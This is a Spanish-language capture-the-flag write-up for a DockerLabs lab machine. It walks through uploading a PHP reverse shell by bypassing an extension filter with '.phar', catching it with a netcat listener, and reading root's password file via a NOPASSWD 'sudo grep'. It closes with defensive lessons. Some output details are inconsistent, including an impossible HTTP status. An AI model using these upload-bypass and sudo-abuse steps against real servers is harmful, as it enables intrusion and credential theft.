# Dockerlabs — Writeup

Dificultad: fácil

Hay algo casi poético en que la máquina vulnerable imite la propia web de DockerLabs — como si el reto se burlara un poco de sí mismo. Aquí el fallo central es de manual: una validación de extensiones de archivo hecha por lista negra, del tipo "bloqueo lo que no me gusta" en vez de "permito solo lo que sé que es seguro". Y como suele pasar con las listas negras, siempre hay una extensión que se les escapa.

IP de laboratorio: `172.17.0.2`

---

## Planteamiento

El camino tiene tres tramos bien diferenciados: encontrar un formulario de subida de archivos escondido tras enumeración web, saltarse su filtro de extensiones mediante fuzzing automatizado con Burp Suite, y una vez dentro como usuario del servicio web, abusar de un permiso de sudo sobre dos binarios aparentemente inofensivos —`cut` y `grep`— para leer un archivo que se suponía inaccesible. La lección de fondo: "solo root puede leerlo" no significa nada si cualquier usuario puede ejecutar como root una herramienta capaz de leer archivos.

---

## Paso 1: reconocimiento de puertos

```bash
nmap -sCV -p- --open 172.17.0.2
```

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.58 (Ubuntu)
```

Un único puerto abierto. Con esa superficie tan reducida, todo el peso del reconocimiento recae en explorar bien el servicio web — no hay atajos por otro lado.

---

## Paso 2: la web imita a DockerLabs (con razón)

```bash
curl 172.17.0.2
```

El HTML devuelto corresponde a una réplica de la interfaz de DockerLabs: un buscador, un filtro de dificultad, el aspecto visual de un catálogo de máquinas. A primera vista no hay nada explotable — es solo una fachada. Toca fuzzing de rutas para ver qué hay detrás de la fachada.

```bash
gobuster dir -u http://172.17.0.2/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,html,txt,xml -b 404,403
```

```
index.php     (Status: 200) [Size: 8235]
uploads       (Status: 301) [Size: 310] [--> http://172.17.0.2/uploads/]
upload.php    (Status: 200) [Size: 0]
machine.php   (Status: 1361)
```

Tres rutas que, juntas, cuentan una historia clara: existe un directorio `/uploads`, un script `upload.php` que probablemente procesa las subidas, y una página `machine.php` que probablemente contiene el formulario visible al usuario.

---

## Paso 3: confirmando el formulario de subida

```bash
curl 172.17.0.2/uploads/
```

Un listado de directorio típico de Apache, vacío por ahora, pero confirmando que ahí es donde van a parar los archivos subidos.

```bash
curl 172.17.0.2/machine.php/
```

```html
<h2>Upload File</h2>
<form action="upload.php" method="post" enctype="multipart/form-data">
    <input type="file" name="file" id="file">
    <input type="submit" name="submit" value="Upload File">
</form>
```

Ahí está: un formulario de subida de archivos apuntando a `upload.php`. La sospecha inmediata en cualquier pentest ante algo así es intentar subir una web shell en PHP y ver qué pasa.

---

## Paso 4: el filtro de extensiones, y por qué las listas negras fallan

Se genera una shell PHP reverse con revshells.com (variante PentestMonkey) y se intenta subir directamente como `shell.php`.

Resultado: rechazada. El servidor exige que el archivo sea `.zip`.

Esto ya dice mucho sobre cómo está implementada la validación: probablemente el backend comprueba si la extensión del archivo coincide con una lista de formatos permitidos (en este caso, solo zip), en vez de analizar el contenido real del archivo o restringir por tipo MIME de forma robusta. Ese tipo de validación superficial es precisamente el terreno donde un ataque de fuzzing de extensiones suele dar resultado.

---

## Paso 5: fuzzing de extensiones con Burp Suite Intruder

La idea es simple: en vez de adivinar a mano qué extensión podría colarse, se automatiza la prueba de decenas de extensiones distintas contra el mismo endpoint de subida.

1. Se intercepta la petición de subida con **Proxy > Intercept** en Burp Suite.
2. La petición capturada se envía al **Intruder** (Ctrl+L con la petición seleccionada).
3. Dentro del Intruder, se marca como posición de payload la extensión del campo `filename` en la petición multipart.
4. Como lista de payloads se carga un diccionario de extensiones comunes, por ejemplo `extensions-most-common.fuzz.txt` de SecLists.
5. Se lanza el ataque y se revisan los códigos de respuesta buscando un `200` que indique subida aceptada, en lugar del rechazo habitual.

El resultado destaca una extensión que sí pasa el filtro: **`.phar`**. Un archivo PHP Archive, formato pensado originalmente para empaquetar aplicaciones PHP completas, pero que Apache con mod_php sigue interpretando y ejecutando como código PHP normal si la configuración no lo excluye explícitamente. La lista negra del formulario simplemente no contemplaba esta extensión.

Con el nombre correcto, la shell renombrada a `shell.phar` se sube sin problema y aparece confirmada en `/uploads/`.

---

## Paso 6: disparar la shell

Antes de ejecutar nada, se levanta el listener en la máquina atacante:

```bash
nc -lvnp 4444
```

Y desde el navegador, se accede directamente a `172.17.0.2/uploads/shell.phar` para forzar su ejecución en el servidor.

```
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 36272
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ whoami
www-data
```

Shell obtenida como `www-data`, el usuario habitual con el que corre Apache. Momento de estabilizar la terminal antes de seguir:

```bash
script /dev/null -c bash
```
```
Ctrl + Z
```
```bash
stty raw -echo; fg
reset xterm
export TERM=xterm
export BASH=bash
```

---

## Paso 7: enumerar qué puede hacer www-data con sudo

```bash
sudo -l
```

```
User www-data may run the following commands on 6dfcfa58d580:
    (root) NOPASSWD: /usr/bin/cut
    (root) NOPASSWD: /usr/bin/grep
```

A primera vista, `cut` y `grep` parecen de los binarios más inofensivos que existen — herramientas de procesamiento de texto, nada que suene a "shell de root" como vim o bash. Pero ahí está precisamente la trampa: cualquier binario capaz de **leer contenido de un archivo**, si se ejecuta con privilegios de root, puede leer literalmente cualquier archivo del sistema, sin importar los permisos que ese archivo tenga configurados para el usuario actual. La barrera de permisos deja de existir en el momento en que el proceso que lee el archivo es root.

---

## Paso 8: encontrando qué merece la pena leer

Una vuelta rápida por el sistema de archivos revela algo interesante en `/opt`:

```bash
cat /opt/nota.txt
```

```
Protege la clave de root, se encuentra en su directorio /root/clave.txt, menos mal que nadie tiene permisos para acceder a ella.
```

Una nota que, sin quererlo, es un mapa perfecto: confirma la existencia de `/root/clave.txt` y asume — erróneamente — que estar dentro de `/root` es protección suficiente. El problema es que "nadie tiene permisos para acceder a ella" solo es cierto si nadie tiene una forma de leer archivos con privilegios de root. Y acabamos de comprobar que sí la hay.

---

## Paso 9: abusar de grep para saltarse el "nadie puede leerlo"

```bash
sudo /usr/bin/grep "" /root/clave.txt
```

Usar una cadena vacía como patrón de búsqueda con `grep` equivale, en la práctica, a pedirle que muestre todas las líneas del archivo — es una forma sencilla de usar grep como si fuera un simple `cat`, pero con privilegios de root gracias al sudo.

```
dockerlabsmolamogollon123
```

La contraseña de root, leída sin ningún tipo de fricción a pesar de que el propio sistema de archivos la tenía protegida contra cualquier usuario que no fuera root.

---

## Paso 10: usar la contraseña recién obtenida

```bash
su root
# Password: dockerlabsmolamogollon123
```

```bash
whoami
# root
id
# uid=0(root) gid=0(root) groups=0(root)
```

Root conseguido, sin necesidad de ningún exploit adicional — solo aprovechando que un permiso de sudo "inofensivo" resultó no serlo tanto.

---

## Resumen técnico

| Fase | Detalle |
|---|---|
| Servicio inicial | Formulario de subida en `machine.php` / `upload.php` |
| Filtro evadido | Lista negra de extensiones (bypass con `.phar`) |
| Acceso obtenido | Shell como www-data vía web shell PHP |
| Vector de escalada | `sudo NOPASSWD` sobre `cut` y `grep` |
| Fuga de información | `/opt/nota.txt` revela ubicación de la clave de root |
| Resultado final | Contraseña de root leída con `sudo grep`, acceso completo |

---

## Qué falló aquí (y cómo se evita)

1. **Validación de subida de archivos basada en lista negra de extensiones.** Bloquear formatos conocidos como peligrosos (`.php`, `.phtml`, etc.) sin cubrir alias y variantes menos comunes (`.phar`, `.pht`, `.phar5`) es una defensa incompleta casi por definición. La alternativa robusta es validar por lista blanca de extensiones permitidas y, si es posible, comprobar el contenido real del archivo además de su nombre.
2. **Permisos de sudo NOPASSWD sobre binarios de lectura de archivos.** Herramientas como `cut`, `grep`, `less`, `more`, `head` o `tail` no parecen peligrosas a simple vista, pero cualquiera capaz de leer contenido arbitrario, si se ejecuta como root, anula por completo cualquier restricción de permisos sobre archivos sensibles. GTFOBins documenta este patrón para numerosos binarios aparentemente inofensivos.
3. **Almacenamiento de contraseñas en texto plano, incluso "bien escondidas".** Confiar en que un archivo está protegido solo porque sus permisos restringen el acceso directo es una falsa sensación de seguridad si existe cualquier otra vía —como un binario con sudo mal configurado— capaz de leerlo igualmente.

---

## Referencias

- GTFOBins — grep: https://gtfobins.github.io/gtfobins/grep/
- GTFOBins — cut: https://gtfobins.github.io/gtfobins/cut/
- SecLists (diccionarios de fuzzing): https://github.com/danielmiessler/SecLists
- revshells.com: https://www.revshells.com/
- DockerLabs: https://dockerlabs.es/
